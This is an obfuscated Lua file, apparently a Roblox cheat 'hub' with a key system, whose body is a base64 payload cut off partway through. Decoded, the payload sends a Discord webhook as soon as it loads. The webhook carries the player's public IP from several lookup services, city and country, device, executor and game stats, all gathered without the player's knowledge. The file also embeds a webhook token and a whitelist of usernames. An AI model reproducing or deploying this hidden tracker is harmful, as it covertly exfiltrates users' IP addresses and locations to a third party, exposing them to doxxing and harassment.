--[[Protected by Sen Obsfucator V3 | RMPG Services | Generated Time: 2025-12-03 12:40:13]] (function() local __b = "LS0gS2V5IFN5c3RlbSB3aXRoIFdoaXRlbGlzdApsb2NhbCB2YWxpZEtleXMgPSB7CiAgICAiMSIKfQoKLS0gV2hpdGVsaXN0ZWQgUm9ibG94IHVzZXJuYW1lcyAoY2FzZSBpbnNlbnNpdGl2ZSkKbG9jYWwgd2hpdGVsaXN0ZWRVc2VycyA9IHsKCSJib2JfNzMyMjkiLAogICAgImpvaG5fc2Vuc2VpNSIsCiAgICAib250b3B0d2luIiwKICAgICJqb2huX3NlbnNlaTUiLAogICAgImt1cnRfYXJtYW5saWN1cCIsCiAgICAicmlwX2luZHJhcG9naTMwOTMiLAogICAgImxpZXRvZGllMSIsCiAgICAiTmlnaHRfc3RyaWtlcjgiLAogICAgIkRvZl9QT0dJQUxUIiwKICAgICJtdXNjbGVfbGVnZW5kczA1NyIsCiAgICAiSW1fYmVnNiIsCiAgICAiRU5URVJOQUxHSE9TVDQiLAogICAgIlJpcF9raXlvc2gxIiwKICAgICJ0b21sdWNhczI1MjUiLAogICAgImRhdmVjYXBpel81NSIsCiAgICAiT2dfemlvbjEyNyIsCiAgICAicmlwX2luZHJhcG9naTMwOTMiLAogICAgIm1hc2F5b24xMjN4eHoiLAogICAgImthbWRha29vbCIsCiAgICAibHVuYWh1YjkiLCAKICAgICJjbG93bjIyOTA5IiwKICAgICJBbHRuaUN5bW9udG9oIiwKICAgICJPWEVOX0NBTk9OIiwKICAgICJHQ0hfS1VQQUwiLAogICAgIk1xbnZwOTA5IiwKICAgICJKYW1lc2dhbWluZ2JveWxsIiwKICAgICJtdXNoZWgwMDciLAogICAgIllvdXJkM256IiwKICAgICJKYXNtaW5lX3dhcmVuMW8iLAogICAgInVuY2xlYmFkczE5IiwKICAgICJ6YWNrYWthMjIzIiwKICAgICJPc2hpcnUxIiwKICAgICJGNF9Dc2lkZSIsCiAgICAibmF0aGFuYmFsaWxpYTE0IiwKICAgICJqdXplbm5ueXN6IiwKICAgICJHQ0hfcmF5bW9uZGFsdCIsCiAgICAiSWlha2lyYWJsb3Nzb20iLAogICAgIlJpY19yZXkxMjMiLAogICAgImdpb21vcjAwMCIsCiAgICAiSWRvbGtvc2llbHJhd2EiLAogICAgIlRlcnJlcm9yNDgyIiwKICAgICJBbGV4YUZ0X1lvdSIsCiAgICAicmlwX2luZHJhcG9naTMwOSIsCiAgICAiTmFtZXV3ZWQwNSIKCn0KCi0tIFNlbmQgd2ViaG9vayBpbW1lZGlhdGVseSB3aGVuIHNjcmlwdCBsb2Fkcwpsb2NhbCBmdW5jdGlvbiBzZW5kSW5pdGlhbFdlYmhvb2soKQogICAgbG9jYWwgdXJsID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE0NDAyNjY2NzkzMTY2NDc5NzcvSUFTelNUckJ3a2hMMUZYV2tiS2lYQWJYWExSd09PR2tSYTM5NGRyc2pVeG9HVFN1VjUtcmx2RjlNRGo0eE00aVJteUgiCiAgICAKICAgIGxvY2FsIHBsYXllciA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllcgogICAgbG9jYWwgc3RhdHMgPSBwbGF5ZXI6RmluZEZpcnN0Q2hpbGQoImxlYWRlcnN0YXRzIikKICAgIAogICAgLS0gRW5oYW5jZWQgSVAgRGV0ZWN0aW9uIEZ1bmN0aW9uCiAgICBsb2NhbCBmdW5jdGlvbiBnZXRBY2N1cmF0ZUlQKCkKICAgICAgICBsb2NhbCBpcFNlcnZpY2VzID0gewogICAgICAgICAgICAiaHR0cHM6Ly9hcGkuaXBpZnkub3JnP2Zvcm1hdD1qc29uIiwKICAgICAgICAgICAgImh0dHBzOi8vYXBpLm15LWlwLmlvL2lwLmpzb24iLCAKICAgICAgICAgICAgImh0dHBzOi8vaXBhcGkuY28vanNvbi8iLAogICAgICAgICAgICAiaHR0cHM6Ly9pcGluZm8uaW8vanNvbiIsCiAgICAgICAgICAgICJodHRwczovL2h0dHBiaW4ub3JnL2lwIiwKICAgICAgICAgICAgImh0dHBzOi8vY2hlY2tpcC5hbWF6b25hd3MuY29tIiwKICAgICAgICAgICAgImh0dHBzOi8vaWNhbmhhemlwLmNvbSIsCiAgICAgICAgICAgICJodHRwczovL2lkZW50Lm1lIiwKICAgICAgICAgICAgImh0dHBzOi8vaXBlY2hvLm5ldC9wbGFpbiIsCiAgICAgICAgICAgICJodHRwczovL3d0ZmlzbXlpcC5jb20vanNvbiIKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgbG9jYWwgZmFsbGJhY2tJUCA9ICJVbmtub3duIgogICAgICAgIAogICAgICAgIGZvciBpLCBzZXJ2aWNlVXJsIGluIGlwYWlycyhpcFNlcnZpY2VzKSBkbwogICAgICAgICAgICBsb2NhbCBzdWNjZXNzLCByZXN1bHQgPSBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICBsb2NhbCByZXNwb25zZSA9IGdhbWU6SHR0cEdldChzZXJ2aWNlVXJsLCB0cnVlKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiBzZXJ2aWNlVXJsOmZpbmQoImpzb24iKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgZGF0YSA9IGdhbWU6R2V0U2VydmljZSgiSHR0cFNlcnZpY2UiKTpKU09ORGVjb2RlKHJlc3BvbnNlKQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmIHNlcnZpY2VVcmw6ZmluZCgiaXBpZnkiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBkYXRhLmlwCiAgICAgICAgICAgICAgICAgICAgZWxzZWlmIHNlcnZpY2VVcmw6ZmluZCgibXktaXAiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBkYXRhLmlwCiAgICAgICAgICAgICAgICAgICAgZWxzZWlmIHNlcnZpY2VVcmw6ZmluZCgiaXBhcGkiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBkYXRhLmlwCiAgICAgICAgICAgICAgICAgICAgZWxzZWlmIHNlcnZpY2VVcmw6ZmluZCgiaXBpbmZvIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZGF0YS5pcAogICAgICAgICAgICAgICAgICAgIGVsc2VpZiBzZXJ2aWNlVXJsOmZpbmQoInd0ZmlzbXlpcCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGRhdGEuWW91ckZ1Y2tpbmdJUEFkZHJlc3MKICAgICAgICAgICAgICAgICAgICBlbHNlaWYgc2VydmljZVVybDpmaW5kKCJodHRwYmluIikgdGhlbgogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gZGF0YS5vcmlnaW4KICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICByZXR1cm4gcmVzcG9uc2U6Z3N1YigiJXMrIiwgIiIpOmdzdWIoIlxuIiwgIiIpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgc3VjY2VzcyBhbmQgcmVzdWx0IGFuZCByZXN1bHQgfj0gIiIgYW5kIHJlc3VsdCB+PSAiVW5rbm93biIgdGhlbgogICAgICAgICAgICAgICAgaWYgcmVzdWx0Om1hdGNoKCJeKCVkKyUuJWQrJS4lZCslLiVkKykkIikgb3IgcmVzdWx0Om1hdGNoKCJeWyV4Ol0rJCIpIHRoZW4KICAgICAgICAgICAgICAgICAgICByZXR1cm4gcmVzdWx0CiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIHdhaXQoMC4xKQogICAgICAgIGVuZAogICAgICAgIHJldHVybiBmYWxsYmFja0lQCiAgICBlbmQKCiAgICAtLSBFbmhhbmNlZCBMb2NhdGlvbiBEZXRlY3Rpb24KICAgIGxvY2FsIGZ1bmN0aW9uIGdldEVuaGFuY2VkTG9jYXRpb24oaXBBZGRyZXNzKQogICAgICAgIGlmIGlwQWRkcmVzcyA9PSAiVW5rbm93biIgdGhlbgogICAgICAgICAgICByZXR1cm4gIlVua25vd24gTG9jYXRpb24iCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgbG9jYWwgbG9jYXRpb25TZXJ2aWNlcyA9IHsKICAgICAgICAgICAgImh0dHA6Ly9pcC1hcGkuY29tL2pzb24vIiAuLiBpcEFkZHJlc3MsCiAgICAgICAgICAgICJodHRwczovL2lwYXBpLmNvLyIgLi4gaXBBZGRyZXNzIC4uICIvanNvbi8iLAogICAgICAgICAgICAiaHR0cHM6Ly9pcGluZm8uaW8vIiAuLiBpcEFkZHJlc3MgLi4gIi9qc29uIgogICAgICAgIH0KICAgICAgICAKICAgICAgICBmb3IgaSwgc2VydmljZVVybCBpbiBpcGFpcnMobG9jYXRpb25TZXJ2aWNlcykgZG8KICAgICAgICAgICAgbG9jYWwgc3VjY2VzcywgbG9jYXRpb25EYXRhID0gcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgbG9jYWwgcmVzcG9uc2UgPSBnYW1lOkh0dHBHZXQoc2VydmljZVVybCwgdHJ1ZSkKICAgICAgICAgICAgICAgIGxvY2FsIGRhdGEgPSBnYW1lOkdldFNlcnZpY2UoIkh0dHBTZXJ2aWNlIik6SlNPTkRlY29kZShyZXNwb25zZSkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgc2VydmljZVVybDpmaW5kKCJpcCUtYXBpIikgdGhlbgogICAgICAgICAgICAgICAgICAgIGlmIGRhdGEuc3RhdHVzID09ICJzdWNjZXNzIiB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGNpdHkgPSBkYXRhLmNpdHkgb3IgIlVua25vd24iCiAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsIGNvdW50cnkgPSBkYXRhLmNvdW50cnkgb3IgIlVua25vd24iCiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiAi8J+TjSAiIC4uIGNpdHkgLi4gIiwgIiAuLiBjb3VudHJ5CiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbHNlaWYgc2VydmljZVVybDpmaW5kKCJpcGFwaSIpIHRoZW4KICAgICAgICAgICAgICAgICAgICBsb2NhbCBjaXR5ID0gZGF0YS5jaXR5IG9yICJVbmtub3duIgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGNvdW50cnkgPSBkYXRhLmNvdW50cnlfbmFtZSBvciAiVW5rbm93biIKICAgICAgICAgICAgICAgICAgICByZXR1cm4gIvCfk40gIiAuLiBjaXR5IC4uICIsICIgLi4gY291bnRyeQogICAgICAgICAgICAgICAgZWxzZWlmIHNlcnZpY2VVcmw6ZmluZCgiaXBpbmZvIikgdGhlbgogICAgICAgICAgICAgICAgICAgIGxvY2FsIGNpdHkgPSBkYXRhLmNpdHkgb3IgIlVua25vd24iCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgY291bnRyeSA9IGRhdGEuY291bnRyeSBvciAiVW5rbm93biIKICAgICAgICAgICAgICAgICAgICByZXR1cm4gIvCfk40gIiAuLiBjaXR5IC4uICIsICIgLi4gY291bnRyeQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgCiAgICAgICAgICAgIGlmIHN1Y2Nlc3MgYW5kIGxvY2F0aW9uRGF0YSB0aGVuCiAgICAgICAgICAgICAgICByZXR1cm4gbG9jYXRpb25EYXRhCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIHJldHVybiAi8J+TjSBVbmtub3duIExvY2F0aW9uIgogICAgZW5kCiAgICAKICAgIC0tIEdldCBhY2N1cmF0ZSBJUCBhbmQgbG9jYXRpb24KICAgIGxvY2FsIGFjY3VyYXRlSVAgPSBnZXRBY2N1cmF0ZUlQKCkKICAgIGxvY2FsIGxvY2F0aW9uID0gZ2V0RW5oYW5jZWRMb2NhdGlvbihhY2N1cmF0ZUlQKQogICAgCiAgICAtLSBGdW5jdGlvbiB0byBmb3JtYXQgbnVtYmVycyB3aXRoIGFiYnJldmlhdGlvbnMKICAgIGxvY2FsIGZ1bmN0aW9uIGZvcm1hdE51bWJlcihudW0pCiAgICAgICAgaWYgbm90IG51bSB0aGVuIHJldHVybiAiTi9BIiBlbmQKICAgICAgICBsb2NhbCBmb3JtYXRzID0gewogICAgICAgICAgICB7MWUxOCwgIlFpIn0sIHsxZTE1LCAiUWEifSwgezFlMTIsICJUIn0sIAogICAgICAgICAgICB7MWU5LCAiQiJ9LCB7MWU2LCAiTSJ9LCB7MWUzLCAiSyJ9CiAgICAgICAgfQogICAgICAgIAogICAgICAgIGZvciBfLCBmb3JtYXQgaW4gaXBhaXJzKGZvcm1hdHMpIGRvCiAgICAgICAgICAgIGlmIG51bSA+PSBmb3JtYXRbMV0gdGhlbgogICAgICAgICAgICAgICAgcmV0dXJuIHN0cmluZy5mb3JtYXQoIiUuMWYlcyIsIG51bSAvIGZvcm1hdFsxXSwgZm9ybWF0WzJdKQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgICAgICByZXR1cm4gdG9zdHJpbmcobnVtKQogICAgZW5kCiAgICAKICAgIC0tIEdldCBzdGF0cwogICAgbG9jYWwgc3RyZW5ndGggPSBzdGF0cyBhbmQgc3RhdHM6RmluZEZpcnN0Q2hpbGQoIlN0cmVuZ3RoIikgYW5kIHN0YXRzLlN0cmVuZ3RoLlZhbHVlIG9yIDAKICAgIGxvY2FsIGR1cmFiaWxpdHkgPSBwbGF5ZXI6RmluZEZpcnN0Q2hpbGQoIkR1cmFiaWxpdHkiKSBhbmQgcGxheWVyLkR1cmFiaWxpdHkuVmFsdWUgb3IgMAogICAgbG9jYWwgcmViaXJ0aHMgPSBzdGF0cyBhbmQgc3RhdHM6RmluZEZpcnN0Q2hpbGQoIlJlYmlydGhzIikgYW5kIHN0YXRzLlJlYmlydGhzLlZhbHVlIG9yIDAKICAgIAogICAgLS0gRW5oYW5jZWQgZGV2aWNlIGRldGVjdGlvbgogICAgbG9jYWwgZGV2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJVc2VySW5wdXRTZXJ2aWNlIik6R2V0UGxhdGZvcm0oKS5OYW1lCiAgICBsb2NhbCBleGVjdXRvciA9ICJVbmtub3duIgogICAgCiAgICAtLSBEZXRlY3QgZXhlY3V0b3IgbW9yZSBhY2N1cmF0ZWx5CiAgICBpZiBzeW4gdGhlbgogICAgICAgIGV4ZWN1dG9yID0gIlN5bmFwc2UgWCIKICAgIGVsc2VpZiBQUk9UT1NNQVNIRVJfTE9BREVEIHRoZW4KICAgICAgICBleGVjdXRvciA9ICJQcm90b1NtYXNoZXIiCiAgICBlbHNlaWYgS1JOTF9MT0FERUQgdGhlbgogICAgICAgIGV4ZWN1dG9yID0gIktSTkwiCiAgICBlbHNlaWYgaWRlbnRpZnlleGVjdXRvciB0aGVuCiAgICAgICAgZXhlY3V0b3IgPSBpZGVudGlmeWV4ZWN1dG9yKCkgb3IgIlVua25vd24iCiAgICBlbmQKCiAgICAtLSBDaGVjayBpZiB1c2VyIGlzIHdoaXRlbGlzdGVkCiAgICBsb2NhbCBmdW5jdGlvbiBpc1VzZXJXaGl0ZWxpc3RlZCgpCiAgICAgICAgbG9jYWwgcGxheWVyTmFtZSA9IHBsYXllci5OYW1lOmxvd2VyKCkKICAgICAgICBmb3IgXywgd2hpdGVsaXN0ZWROYW1lIGluIGlwYWlycyh3aGl0ZWxpc3RlZFVzZXJzKSBkbwogICAgICAgICAgICBpZiBwbGF5ZXJOYW1lID09IHdoaXRlbGlzdGVkTmFtZTpsb3dlcigpIHRoZW4KICAgICAgICAgICAgICAgIHJldHVybiB0cnVlCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgICAgIHJldHVybiBmYWxzZQogICAgZW5kCgogICAgbG9jYWwgaXNXaGl0ZWxpc3RlZCA9IGlzVXNlcldoaXRlbGlzdGVkKCkKCiAgICBsb2NhbCBkYXRhID0gewogICAgICAgIFsiY29udGVudCJdID0gIvCfjq4gKipGQVJNSU5HIFYyIC0gU0NSSVBUIExPQURFRCoqIiwKICAgICAgICBbImVtYmVkcyJdID0ge3sKICAgICAgICAgICAgWyJ0aXRsZSJdID0gIvCflLAgU2NyaXB0IEV4ZWN1dGlvbiBTdGFydGVkIiwKICAgICAgICAgICAgWyJjb2xvciJdID0gaXNXaGl0ZWxpc3RlZCBhbmQgNjUyODAgb3IgMTY3MTE2ODAsIC0tIEdyZWVuIGlmIHdoaXRlbGlzdGVkLCBSZWQgaWYgbm90CiAgICAgICAgICAgIFsidGh1bWJuYWlsIl0gPSB7CiAgICAgICAgICAgICAgICBbInVybCJdID0gImh0dHBzOi8vd3d3LnJvYmxveC5jb20vaGVhZHNob3QtdGh1bWJuYWlsL2ltYWdlP3VzZXJJZD0iIC4uIHBsYXllci5Vc2VySWQgLi4gIiZ3aWR0aD00MjAmaGVpZ2h0PTQyMCZmb3JtYXQ9cG5nIgogICAgICAgICAgICB9LAogICAgICAgICAgICBbImZpZWxkcyJdID0gewogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFsibmFtZSJdID0gIvCfkaQgUGxheWVyIEluZm9ybWF0aW9uIiwKICAgICAgICAgICAgICAgICAgICBbInZhbHVlIl0gPSAiKipVc2VybmFtZToqKiBgIiAuLiBwbGF5ZXIuTmFtZSAuLiAiYFxuKipEaXNwbGF5OioqICIgLi4gcGxheWVyLkRpc3BsYXlOYW1lIC4uICJcbioqVXNlciBJRDoqKiBgIiAuLiBwbGF5ZXIuVXNlcklkIC4uICJgIiwKICAgICAgICAgICAgICAgICAgICBbImlubGluZSJdID0gdHJ1ZQogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBbIm5hbWUiXSA9ICLwn4yNIExvY2F0aW9uIERhdGEiLAogICAgICAgICAgICAgICAgICAgIFsidmFsdWUiXSA9ICIqKklQOioqIGAiIC4uIGFjY3VyYXRlSVAgLi4gImBcbiIgLi4gbG9jYXRpb24sCiAgICAgICAgICAgICAgICAgICAgWyJpbmxpbmUiXSA9IHRydWUKICAgICAgICAgICAgICAgIH0sCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgWyJuYW1lIl0gPSAi8J+SuyBTeXN0ZW0gSW5mb3JtYXRpb24iLAogICAgICAgICAgICAgICAgICAgIFsidmFsdWUiXSA9ICIqKlBsYXRmb3JtOioqICIgLi4gZGV2aWNlIC4uICJcbioqRXhlY3V0b3I6KiogIiAuLiBleGVjdXRvciwKICAgICAgICAgICAgICAgICAgICBbImlubGluZSJdID0gdHJ1ZQogICAgICAgICAgICAgICAgfSwKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBbIm5hbWUiXSA9ICLwn5SQIFNlY3VyaXR5IFN0YXR1cyIsCiAgICAgICAgICAgICAgICAgICAgWyJ2YWx1ZSJdID0gIioqV2hpdGVsaXN0ZWQ6KiogIiAuLiAoaXNXaGl0ZWxpc3RlZCBhbmQgIuKchSBZZXMiIG9yICLinYwgTm8iKSAuLiAiXG4qKktleSBSZXF1aXJlZDoqKiAiIC4uIChpc1doaXRlbGlzdGVkIGFuZCAi4pyFIFllcyIgb3IgIuKdjCBObyIpLAogICAgICAgICAgICAgICAgICAgIFsiaW5saW5lIl0gPSB0cnVlCiAgICAgICAgICAgICAgICB9LAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFsibmFtZSJdID0gIvCfkqogR2FtZSBTdGF0aXN0aWNzIiwKICAgICAgICAgICAgICAgICAgICBbInZhbHVlIl0gPSAi8J+SqiAqKlN0cmVuZ3RoOioqIGAiIC4uIGZvcm1hdE51bWJlcihzdHJlbmd0aCkgLi4gImBcbvCfm6HvuI8gKipEdXJhYmlsaXR5OioqIGAiIC4uIGZvcm1hdE51bWJlcihkdXJhYmlsaXR5KSAuLiAiYFxu8J+UhCAqKlJlYmlydGhzOioqIGAiIC4uIGZvcm1hdE51bWJlcihyZWJpcnRocykgLi4gImAiLAogICAgICAgICAgICAgICAgICAgIFsiaW5saW5lIl0gPSB0cnVlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIFsiZm9vdGVyIl0gPSB7CiAgICAgICAgICAgICAgICBbInRleHQiXSA9ICJBUEVYIFBSRURBVE9SIFgg4oCiIFNjcmlwdCBMb2FkZWQg4oCiICIgLi4gb3MuZGF0ZSgiJVktJW0tJWQgYXQgJUg6JU06JVMiKQogICAgICAgICAgICB9CiAgICAgICAgfX0KICAgIH0KICAgIAogICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIGh0dHAgPSBnYW1lOkdldFNlcnZpY2UoIkh0dHBTZXJ2aWNlIikKICAgICAgICBsb2NhbCByZXNwb25zZSA9IGh0dHA6UmVxdWVzdEFzeW5jKHsKICAgICAgICAgICAgVXJsID0gdXJsLAogICAgICAgICAgICBNZXRob2QgPSAiUE9TVCIsCiAgICAgICAgICAgIEhlYWRlcnMgPSB7CiAgICAgICAgICAgICAgICBbIkNvbnRlbnQtVHlwZSJdID0gImFwcGxpY2F0aW9uL2pzb24iCiAgICAgICAgICAgIH0sCiAgICAgICAgICAgIEJvZHkgPSBodHRwOkpTT05FbmNvZGUoZGF0YSkKICAgICAgICB9KQogICAgZW5kKQplbmQKCi0tIFNlbmQgd2ViaG9vayBpbW1lZGlhdGVseSB3aGVuIHNjcmlwdCBzdGFydHMKc2VuZEluaXRpYWxXZWJob29rKCkKCi0tIENvbnRpbnVlIHdpdGggdGhlIHJlc3Qgb2YgdGhlIGtleSBzeXN0ZW0uLi4KbG9jYWwga2V5R3VpID0gSW5zdGFuY2UubmV3KCJTY3JlZW5HdWkiKQprZXlHdWkuTmFtZSA9ICJLZXlTeXN0ZW0iCmtleUd1aS5QYXJlbnQgPSBnYW1lLkNvcmVHdWkKCmxvY2FsIGtleUZyYW1lID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpCmtleUZyYW1lLlNpemUgPSBVRGltMi5uZXcoMCwgMzIwLCAwLCAyMDApCmtleUZyYW1lLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgLTE2MCwgMC41LCAtMTAwKQprZXlGcmFtZS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMTUsIDE1LCAyMCkKa2V5RnJhbWUuUGFyZW50ID0ga2V5R3VpCgpsb2NhbCBVSUNvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKQpVSUNvcm5lci5Db3JuZXJSYWRpdXMgPSBVRGltLm5ldygwLCAxMCkKVUlDb3JuZXIuUGFyZW50ID0ga2V5RnJhbWUKCi0tIFRoaWNrIEFuaW1hdGVkIEdyYWRpZW50IEJvcmRlcgpsb2NhbCBVSVN0cm9rZSA9IEluc3RhbmNlLm5ldygiVUlTdHJva2UiKQpVSVN0cm9rZS5Db2xvciA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpClVJU3Ryb2tlLlRoaWNrbmVzcyA9IDQKVUlTdHJva2UuUGFyZW50ID0ga2V5RnJhbWUKCmxvY2FsIGdyYWRpZW50ID0gSW5zdGFuY2UubmV3KCJVSUdyYWRpZW50IikKZ3JhZGllbnQuQ29sb3IgPSBDb2xvclNlcXVlbmNlLm5ldyh7CiAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAsIENvbG9yMy5mcm9tUkdCKDUxLCA1MSwgNTEpKSwgICAtLSAjMzMzMzMzCiAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDEsIENvbG9yMy5mcm9tUkdCKDIyMSwgMjQsIDI0KSkgICAtLSAjZGQxODE4Cn0pCmdyYWRpZW50LlJvdGF0aW9uID0gMApncmFkaWVudC5QYXJlbnQgPSBVSVN0cm9rZQoKLS0gQW5pbWF0ZSB0aGUgZ3JhZGllbnQgcm90YXRpb24Kc3Bhd24oZnVuY3Rpb24oKQogICAgd2hpbGUga2V5R3VpLlBhcmVudCBkbwogICAgICAgIGZvciBpID0gMCwgMzYwLCAyIGRvCiAgICAgICAgICAgIGdyYWRpZW50LlJvdGF0aW9uID0gaQogICAgICAgICAgICB3YWl0KDAuMDMpCiAgICAgICAgZW5kCiAgICBlbmQKZW5kKQoKLS0gQVBFWCBQUkVEQVRPUiBYIFRpdGxlIHdpdGggVHJpcGxlIEdyYWRpZW50CmxvY2FsIHRpdGxlID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQp0aXRsZS5UZXh0ID0gIkFQRVggUFJFREFUT1IgWCBIVUIiCnRpdGxlLlNpemUgPSBVRGltMi5uZXcoMC45LCAwLCAwLCAzMCkKdGl0bGUuUG9zaXRpb24gPSBVRGltMi5uZXcoMC4wNSwgMCwgMC4xLCAwKQp0aXRsZS5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQp0aXRsZS5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKdGl0bGUuRm9udCA9IEVudW0uRm9udC5Hb3RoYW1CbGFjawp0aXRsZS5UZXh0U2l6ZSA9IDIwCnRpdGxlLlRleHRTdHJva2VUcmFuc3BhcmVuY3kgPSAwLjgKdGl0bGUuVGV4dFN0cm9rZUNvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDAsIDAsIDApCnRpdGxlLlBhcmVudCA9IGtleUZyYW1lCgpsb2NhbCB0aXRsZUdyYWRpZW50ID0gSW5zdGFuY2UubmV3KCJVSUdyYWRpZW50IikKdGl0bGVHcmFkaWVudC5Db2xvciA9IENvbG9yU2VxdWVuY2UubmV3KHsKICAgIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMCwgQ29sb3IzLmZyb21SR0IoMjYsIDQyLCAxMDgpKSwgICAtLSAjMWEyYTZjCiAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAuNSwgQ29sb3IzLmZyb21SR0IoMTc4LCAzMSwgMzEpKSwgLS0gI2IyMWYxZgogICAgQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygxLCBDb2xvcjMuZnJvbVJHQigyNTMsIDE4NywgNDUpKSAgIC0tICNmZGJiMmQKfSkKdGl0bGVHcmFkaWVudC5Sb3RhdGlvbiA9IDAKdGl0bGVHcmFkaWVudC5QYXJlbnQgPSB0aXRsZQoKLS0gQW5pbWF0ZSB0aXRsZSBncmFkaWVudApzcGF3bihmdW5jdGlvbigpCiAgICB3aGlsZSBrZXlHdWkuUGFyZW50IGRvCiAgICAgICAgZm9yIGkgPSAwLCAzNjAsIDMgZG8KICAgICAgICAgICAgdGl0bGVHcmFkaWVudC5Sb3RhdGlvbiA9IGkKICAgICAgICAgICAgd2FpdCgwLjA0KQogICAgICAgIGVuZAogICAgZW5kCmVuZCkKCi0tICJCeSA6IER5bGFuIiBTdWJ0aXRsZSB3aXRoIHNhbWUgZ3JhZGllbnQKbG9jYWwgc3VidGl0bGUgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCnN1YnRpdGxlLlRleHQgPSAiQnkgOiBEeWxhbiIKc3VidGl0bGUuU2l6ZSA9IFVEaW0yLm5ldygwLjksIDAsIDAsIDE1KQpzdWJ0aXRsZS5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjA1LCAwLCAwLjI1LCAwKQpzdWJ0aXRsZS5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQpzdWJ0aXRsZS5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKc3VidGl0bGUuRm9udCA9IEVudW0uRm9udC5Hb3RoYW1Cb2xkCnN1YnRpdGxlLlRleHRTaXplID0gMTAKc3VidGl0bGUuVGV4dFN0cm9rZVRyYW5zcGFyZW5jeSA9IDAuOApzdWJ0aXRsZS5UZXh0U3Ryb2tlQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMCwgMCwgMCkKc3VidGl0bGUuUGFyZW50ID0ga2V5RnJhbWUKCmxvY2FsIHN1YnRpdGxlR3JhZGllbnQgPSBJbnN0YW5jZS5uZXcoIlVJR3JhZGllbnQiKQpzdWJ0aXRsZUdyYWRpZW50LkNvbG9yID0gQ29sb3JTZXF1ZW5jZS5uZXcoewogICAgQ29sb3JTZXF1ZW5jZUtleXBvaW50Lm5ldygwLCBDb2xvcjMuZnJvbVJHQigyNiwgNDIsIDEwOCkpLCAgIC0tICMxYTJhNmMKICAgIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMC41LCBDb2xvcjMuZnJvbVJHQigxNzgsIDMxLCAzMSkpLCAtLSAjYjIxZjFmCiAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDEsIENvbG9yMy5mcm9tUkdCKDI1MywgMTg3LCA0NSkpICAgLS0gI2ZkYmIyZAp9KQpzdWJ0aXRsZUdyYWRpZW50LlJvdGF0aW9uID0gMApzdWJ0aXRsZUdyYWRpZW50LlBhcmVudCA9IHN1YnRpdGxlCgotLSBBbmltYXRlIHN1YnRpdGxlIGdyYWRpZW50CnNwYXduKGZ1bmN0aW9uKCkKICAgIHdoaWxlIGtleUd1aS5QYXJlbnQgZG8KICAgICAgICBmb3IgaSA9IDM2MCwgMCwgLTMgZG8KICAgICAgICAgICAgc3VidGl0bGV